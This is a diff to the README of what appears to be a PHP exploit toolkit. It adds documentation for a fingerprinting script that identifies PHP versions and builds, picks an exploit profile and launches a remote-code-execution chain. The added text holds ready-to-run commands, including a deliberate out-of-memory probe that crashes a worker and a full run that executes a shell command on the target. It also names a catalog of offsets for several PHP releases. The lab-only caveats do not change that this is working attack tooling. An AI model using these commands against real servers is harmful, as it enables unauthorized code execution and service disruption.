@@ -31,6 +31,43 @@ python3 probe_default.py --port 18090 --pressure 1000 --levels 60
 
 The filter target uses `memory_limit=28M` in `lab/httpd-filter.conf`; the default target uses `memory_limit=128M` and `post_max_size=8M` in `lab/httpd-default.conf`. Recalibrate if the name length or body size changes.
 
+## Fingerprinting and profiles
+
+`fingerprint.py` identifies the PHP version, server/distro, SAPI hint, architecture
+override and known build profile, then can dispatch the matching exploit.
+
+```bash
+# passive: headers, body hints, cookies, profile ranking
+python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64
+
+# small upload-progress probe (authorized lab; no OOM)
+python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --active
+
+# one controlled OOM to discover memory_limit (kills/rotates a worker)
+python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --oom-probe
+
+# fingerprint -> profile -> exploit proof
+python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 \
+    --oom-probe --run -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1
+```
+
+`--json` includes the fingerprint and ranked profiles. `--profile NAME` forces a
+profile; `--list-profiles` prints the catalog. HTTP does not expose CPU
+architecture, so remote auto-dispatch requires `--arch` when both architecture
+profiles exist.
+
+The profile catalog lives in `profiles/catalog.json`; individual
+`profiles/*.json` files override catalog entries. It currently covers the public
+8.5.11/8.5.10/8.4.26/8.4.25 verified images plus offsets-only and leak-only
+entries for 8.3, 8.2, 8.1, 8.0 and 7.4. Only a profile with `rce: true` and all
+stage parameters can be auto-run. See `profiles/README.md` for sources and the
+exact status table.
+
+The exploit target must be Apache prefork `mod_php` with one worker. This port
+does not pin multiple prefork children; a known multi-worker target is marked
+incompatible. The OOM probe and the chain are disruptive; use them only on an
+authorized, disposable lab.
+
 ## Session chain
 
 `session_exploit.py` ports the 9bie/Exploit-DB three-stage session chain (pre-RINIT OOM → `Set-Cookie` leaks → fake reference → `zif_system`).
